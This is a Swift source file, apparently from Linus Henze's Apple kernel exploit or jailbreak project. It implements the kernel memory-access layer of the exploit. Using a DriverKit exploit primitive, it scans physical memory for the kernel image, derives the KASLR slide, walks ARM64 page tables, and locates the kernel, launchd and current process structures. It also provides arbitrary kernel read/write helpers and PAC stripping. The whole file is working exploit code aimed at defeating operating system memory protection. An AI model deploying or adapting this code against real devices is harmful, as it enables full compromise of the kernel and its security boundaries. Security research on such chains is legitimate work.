//
//  MemoryAccess.swift
//  KernelExploit
//
//  Created by Linus Henze.
//  Copyright Â© 2021 Linus Henze. All rights reserved.
//

import Foundation
import JailbreakUtils
import Darwin
import CoreFoundation

public enum MemoryAccessError: Error {
    case failedToInitialize
    case attemptedToReadMoreThanAPage
    case attemptedToWriteMoreThanAPage
    case failedToReadKernelData
    case failedToWriteKernelData
    case failedToWriteIntoOurBuffer
    case failedToReadIntoDMABuffer
    case failedToTranslate(address: UInt64, table: String, entry: UInt64)
    case failedToCopyFromRemote
    case failedToCopyToRemote
    
    case failedToFindSomeProc
}

public class MemoryAccess {
    private static var setupDone = false
    private static var uc: PWNUC?
    
    private let uc: PWNUC
    
    public private(set) var kernelPhysBase: UInt64!
    public private(set) var kernelVirtBase: UInt64!
    public private(set) var unslidVirtBase: UInt64 = 0xFFFFFFF007004000
    public var kernelSlide: UInt64 {
        return kernelVirtBase - unslidVirtBase
    }
    
    public private(set) var offsets: Offsets.KernelOffsetsEntry!
    
    public private(set) var thisProc: UInt64 = 0
    public private(set) var kernelProc: UInt64 = 0
    public private(set) var launchdProc: UInt64 = 0
    
    var ttbr1: UInt64!
    
    public static func setup() throws {
        guard let checkin = getDKCheckinData() else {
            throw MemoryAccessError.failedToInitialize
        }
        
        defer { mach_port_destroy(mach_task_self_, checkin.token) }
        
        uc = try dkLaunchExploit(token: checkin.token, tag: checkin.tag)
        setupDone = true
    }
    
    public static func setupUsingRawPorts(dkSvPort: mach_port_t, ucPort: mach_port_t, physMemDesc: mach_port_t, dmaPort: mach_port_t, dmaDesc: mach_port_t, mapAddr: UInt, remoteTask: mach_port_t) {
        // Will be unable to get any class due to ioPort being zero
        gDK = DriverKit(svPort: dkSvPort, ioPort: 0)
        
        let dma = PWNDMA(port: dmaPort, dmaMemDesc: dmaDesc, mapAddr: mapAddr, otherTask: remoteTask)
        uc = PWNUC(port: ucPort, dmaCmd: dma, memDesc: physMemDesc)
        setupDone = true
    }
    
    public init(noLog: Bool = false) throws {
        let physMemBase: UInt64 = 0x800000000
        if !Self.setupDone {
            try Self.setup()
        }
        
        uc = Self.uc.unsafelyUnwrapped
        
        // Setup stuff
        var cur: UInt64 = 0
        while cur < physMemBase + 0x2000000 {
            if isKernel(address: physMemBase + cur) {
                kernelPhysBase = physMemBase + cur
                kernelVirtBase = try r64(phys: kernelPhysBase + 0x38)
                
                // Code below should actually be in offsets.swift...
                
                // Read kernel MachO header
                let kernel = try readBytes(phys: kernelPhysBase, count: 0x4000)
                
                // Read as MachO
                let kernelMachO = try MachO(fromData: kernel)
                
                let slide = kernelVirtBase - unslidVirtBase
                
                // Iterate over all the segments to find __TEXT_EXEC,__text and __DATA,__data
                var textExec: (Data, UInt64)!
                var dataSect: (Data, UInt64)!
                var cStrSect: (Data, UInt64)!
                var cnstSect: (Data, UInt64)!
                var pplText:  (Data, UInt64)!
                var start: UInt64!
                for cmd in kernelMachO.cmds {
                    if let seg = cmd as? Segment64LoadCommand {
                        if seg.name == "__TEXT_EXEC" {
                            for sect in seg.sections {
                                if sect.section == "__text" {
                                    textExec  = (try readBytes(phys: kernelPhysBase + UInt64(sect.offset), count: sect.size), sect.address)
                                }
                            }
                        } else if seg.name == "__DATA" {
                            for sect in seg.sections {
                                if sect.section == "__data" {
                                    dataSect  = (try readBytes(phys: kernelPhysBase + UInt64(sect.offset), count: sect.size), sect.address)
                                }
                            }
                        } else if seg.name == "__TEXT" {
                            for sect in seg.sections {
                                if sect.section == "__cstring" {
                                    cStrSect  = (try readBytes(phys: kernelPhysBase + UInt64(sect.offset), count: sect.size), sect.address)
                                }
                            }
                        } else if seg.name == "__DATA_CONST" {
                            for sect in seg.sections {
                                if sect.section == "__const" {
                                    cnstSect  = (try readBytes(phys: kernelPhysBase + UInt64(sect.offset), count: sect.size), sect.address)
                                }
                            }
                        } else if seg.name == "__PPLTEXT" {
                            for sect in seg.sections {
                                if sect.section == "__text" {
                                    pplText   = (try readBytes(phys: kernelPhysBase + UInt64(sect.offset), count: sect.size), sect.address)
                                }
                            }
                        }
                    } else if let c = cmd as? OpaqueLoadCommand {
                        if c.type == .Unknown(0x5) {
                            start = c.data.getGeneric(type: UInt64.self, offset: 0x108) + slide
                        }
                    }
                }
                
                // Why throw exceptions when you can just call fatalError???
                guard textExec != nil else {
                    fatalError("Failed to find __TEXT_EXEC,__text!")
                }
                
                guard dataSect != nil else {
                    fatalError("Failed to find __DATA,__data!")
                }
                
                guard cStrSect != nil else {
                    fatalError("Failed to find __TEXT,__cstring!")
                }
                
                guard cnstSect != nil else {
                    fatalError("Failed to find __DATA_CONST,__const!")
                }
                
                guard pplText != nil else {
                    fatalError("Failed to find __PPLTEXT,__text!")
                }
                
                guard start != nil else {
                    fatalError("Failed to find start function!")
                }
                
                offsets = try Offsets.findOffsetsForThisDevice(textExec: textExec, dataSect: dataSect, cStrSect: cStrSect, cnstSect: cnstSect, pplText: pplText, start: start, slide: slide, noLog: noLog)
                
                ttbr1 = try r64(phys: (offsets.pagetable + slide) &- kernelVirtBase &+ kernelPhysBase)
                
                // Find some procs
                let myPID = getpid()
                var curProc = try r64(virt: offsets.allProcAddr + kernelSlide)
                while curProc != 0 {
                    let pid = try r32(virt: curProc + offsets.procStruct.pidOffset)
                    if pid == myPID {
                        thisProc = curProc
                    } else if pid == 0 {
                        kernelProc = curProc
                    } else if pid == 1 {
                        launchdProc = curProc
                    }
                    
                    if thisProc != 0 && kernelProc != 0 && launchdProc != 0 {
                        break
                    }
                    
                    curProc = try r64(virt: curProc + offsets.procStruct.nextOffset)
                }
                
                guard thisProc != 0 && kernelProc != 0 && launchdProc != 0 else {
                    throw MemoryAccessError.failedToFindSomeProc
                }
                
                offsets = try Offsets.findThreadNextOffset(mem: self, thisProc: thisProc, noLog: noLog)
                
                return
            }
            
            cur += 0x4000
        }
        
        fatalError("Couldn't find kernel!")
    }
    
    private func isKernel(address: UInt64) -> Bool {
        guard (try? r32(phys: address)) == 0xFEEDFACF else {
            return false
        }
        
        guard (try? r32(phys: address+0x4)) == 0x100000C else {
            return false
        }
        
        guard (try? r32(phys: address+0x8)) == 0xC0000002 else {
            return false
        }
        
        return true
    }
    
    public func unsafeMapAddress(phys: UInt64, size: UInt64) throws -> UInt64 {
        let desc = try uc.getPhysMemDesc(forAddress: phys, size: size)
        return try mapDescriptor(desc)
    }
    
    public func virt2phys(_ virt: UInt64) throws -> UInt64 {
        return try walkPageTable(table: ttbr1, virt: virt)
    }
    
    private func _walkPageTable(table: UInt64, virt: UInt64) throws -> UInt64 {
        //Logger.fmt("Translating %p", virt)
        
        let table1Off = (virt >> 36) & 0x7
        let table1Entry = try r64(phys: table + (8 * table1Off))
        //Logger.fmt("Table1 entry: %p", table1Entry)
        guard (table1Entry & 0x3) == 3 else {
            throw MemoryAccessError.failedToTranslate(address: virt, table: "table1", entry: table1Entry)
        }
        
        let table2 = table1Entry & 0xFFFFFFFFC000
        let table2Off = (virt >> 25) & 0x7FF
        let table2Entry = try r64(phys: table2 + (8 * table2Off))
        //Logger.fmt("Table2 entry: %p", table2Entry)
        switch table2Entry & 0x3 {
        case 1:
            // Easy, this is a block
            return (table2Entry & 0xFFFFFE000000) | (virt & 0x1FFFFFF)
            
        case 3:
            // Another table
            let table3 = table2Entry & 0xFFFFFFFFC000
            let table3Off = (virt >> 14) & 0x7FF
            let table3Entry = try r64(phys: table3 + (8 * table3Off))
            //Logger.fmt("Table3 entry: %p", table3Entry)
            guard (table3Entry & 0x3) == 3 else {
                throw MemoryAccessError.failedToTranslate(address: virt, table: "table3", entry: table3Entry)
            }
            
            return (table3Entry & 0xFFFFFFFFC000) | (virt & 0x3FFF)
        default:
            throw MemoryAccessError.failedToTranslate(address: virt, table: "table2", entry: table2Entry)
        }
    }
    
    public func walkPageTable(table: UInt64, virt: UInt64) throws -> UInt64 {
        let res = try _walkPageTable(table: table, virt: virt)
        if res == 0 {
            throw MemoryAccessError.failedToTranslate(address: virt, table: "Unknown", entry: 0)
        }
        
        return res
    }
    
    // I hope this *finally* works as it should
    private func _readBytes(virt: UInt64, count: UInt64, prev: Data? = nil) throws -> Data {
        // This should be a recursive function, but Swift's tail call optimization is really bad
        var virt = virt
        var count = count
        var prev = prev
        while true {
            if count == 0 {
                if prev != nil {
                    return prev.unsafelyUnwrapped
                }
                
                return Data()
            }
            
            // Get physical address for this page
            let phys = try virt2phys(virt)
            
            // Check if address + count spans multiple pages
            let startPage = virt & ~0x3FFF
            let endPage   = (virt + (count - 1)) & ~0x3FFF
            if startPage != endPage {
                // Multiple pages
                // This requires multiple lookups
                // Read the start page first
                let bytesToRead = 0x4000 - (virt & 0x3FFF)
                
                var read = try readBytes(phys: phys, count: bytesToRead)
                if prev != nil {
                    // Have previous data, prepend it
                    read = prev.unsafelyUnwrapped + read
                }
                
                // Read the rest, recursively
                virt = virt + bytesToRead
                count = count - bytesToRead
                prev = read
                continue
            }
            
            // Only a single page, this is easy
            var res = try readBytes(phys: phys, count: count)
            if prev != nil {
                res = prev.unsafelyUnwrapped + res
            }
            
            return res
        }
    }
    
    /**
     * Read some bytes (physical address).
     */
    public func readBytes(phys: UInt64, count: UInt64) throws -> Data {
        var res = Data()
        var phys = phys
        var count = count
        
        outerLoop:
        while count > 0 {
            // Try up to 10 times
            var lastErr: Error!
            for _ in 0..<10 {
                do {
                    let ct = (count > 0x4000) ? 0x4000 : count
                    let data = try uc.readBytes(phys: phys, count: ct)
                    res += data
                    count -= ct
                    phys += ct
                    continue outerLoop
                } catch let e {
                    lastErr = e
                }
            }
            
            throw lastErr
        }
        
        return res
    }
    
    /**
     * Read some bytes (virtual address).
     */
    public func readBytes(virt: UInt64, count: UInt64) throws -> Data {
        return try _readBytes(virt: virt, count: count)
    }
    
    /**
     * Write some bytes (physical address).
     */
    public func writeBytes(phys: UInt64, data: Data) throws {
        // Try up to 10 times
        var lastErr: Error!
        for _ in 0..<10 {
            do {
                try uc.writeBytes(phys: phys, data: data)
                return
            } catch let e {
                lastErr = e
            }
        }
        
        throw lastErr
    }
    
    /**
     * Write some bytes (virtual address).
     */
    public func writeBytes(virt: UInt64, data: Data) throws {
        if data.count == 0 {
            return
        }
        
        // Get physical address for this page
        let phys = try virt2phys(virt)
        
        // Check if address + count spans multiple pages
        let startPage = virt & ~0x3FFF
        let endPage   = (virt + UInt64(data.count - 1)) & ~0x3FFF
        if startPage != endPage {
            // Multiple pages
            // This requires multiple lookups
            // Write to the start page first
            let bytesToWrite = 0x4000 - (virt & 0x3FFF)
            
            let subdata = data[0..<Int(bytesToWrite)]
            try writeBytes(phys: phys, data: subdata)
            
            // Write the rest, recursively
            // FIXME: This shouldn't be a recursive function
            return try writeBytes(virt: virt + bytesToWrite, data: data[Int(bytesToWrite)...])
        }
        
        // Only a single page, this is easy
        try writeBytes(phys: phys, data: data)
    }
    
    public func r64(phys: UInt64) throws -> UInt64 {
        return try readBytes(phys: phys, count: 8).getGeneric(type: UInt64.self)
    }
    
    public func r64(virt: UInt64) throws -> UInt64 {
        return try readBytes(virt: virt, count: 8).getGeneric(type: UInt64.self)
    }
    
    public func r32(phys: UInt64) throws -> UInt32 {
        return try readBytes(phys: phys, count: 4).getGeneric(type: UInt32.self)
    }
    
    public func r32(virt: UInt64) throws -> UInt32 {
        return try readBytes(virt: virt, count: 4).getGeneric(type: UInt32.self)
    }
    
    public func r16(phys: UInt64) throws -> UInt16 {
        return try readBytes(phys: phys, count: 2).getGeneric(type: UInt16.self)
    }
    
    public func r16(virt: UInt64) throws -> UInt16 {
        return try readBytes(virt: virt, count: 2).getGeneric(type: UInt16.self)
    }
    
    public func r8(phys: UInt64) throws -> UInt8 {
        return try readBytes(phys: phys, count: 1).getGeneric(type: UInt8.self)
    }
    
    public func r8(virt: UInt64) throws -> UInt8 {
        return try readBytes(virt: virt, count: 1).getGeneric(type: UInt8.self)
    }
    
    public func w64(phys: UInt64, data: UInt64) throws {
        let dat = Data(fromObject: data)
        try writeBytes(phys: phys, data: dat)
    }
    
    public func w64(virt: UInt64, data: UInt64) throws {
        let dat = Data(fromObject: data)
        try writeBytes(virt: virt, data: dat)
    }
    
    public func w32(phys: UInt64, data: UInt32) throws {
        let dat = Data(fromObject: data)
        try writeBytes(phys: phys, data: dat)
    }
    
    public func w32(virt: UInt64, data: UInt32) throws {
        let dat = Data(fromObject: data)
        try writeBytes(virt: virt, data: dat)
    }
    
    public func w16(phys: UInt64, data: UInt16) throws {
        let dat = Data(fromObject: data)
        try writeBytes(phys: phys, data: dat)
    }
    
    public func w16(virt: UInt64, data: UInt16) throws {
        let dat = Data(fromObject: data)
        try writeBytes(virt: virt, data: dat)
    }
    
    public func w8(phys: UInt64, data: UInt8) throws {
        let dat = Data(fromObject: data)
        try writeBytes(phys: phys, data: dat)
    }
    
    public func w8(virt: UInt64, data: UInt8) throws {
        let dat = Data(fromObject: data)
        try writeBytes(virt: virt, data: dat)
    }
    
    public func rStr(phys: UInt64) throws -> String {
        var ctr: UInt64 = 0
        var res = ""
        while true {
            let b = try r8(phys: phys + ctr)
            if b == 0 {
                return res
            }
            
            res += String(b)
            ctr += 1
        }
    }
    
    public func rStr(virt: UInt64) throws -> String {
        var ctr: UInt64 = 0
        var res = ""
        while true {
            let b = try r8(virt: virt + ctr)
            if b == 0 {
                return res
            }
            
            res += String(format: "%c", b)
            ctr += 1
        }
    }
    
    public func stripPAC(fromPtr ptr: UInt64) -> UInt64 {
        if ((ptr >> 55) & 1) == 1 {
            // Kernel pointer
            return ptr | 0xFFFFFF8000000000
        }
        
        return ptr // Do nothing, for now
    }
    
    public func rPtr(phys: UInt64) throws -> UInt64 {
        return stripPAC(fromPtr: try r64(phys: phys))
    }
    
    public func rPtr(virt: UInt64) throws -> UInt64 {
        return stripPAC(fromPtr: try r64(virt: virt))
    }
    
    public func getKrwData() -> (dkSvPort: mach_port_t, ucPort: mach_port_t, physMemDesc: mach_port_t, dmaPort: mach_port_t, dmaDesc: mach_port_t, mapAddr: UInt) {
        return (dkSvPort: gDK.serverPort, ucPort: Self.uc!.uextPort, physMemDesc: Self.uc!.entireMemDesc as! mach_port_t, dmaPort: Self.uc!.dmaCmd.uextPort, dmaDesc: Self.uc!.dmaCmd.memDesc as! mach_port_t, mapAddr: Self.uc!.dmaCmd.mapAddr)
    }
}
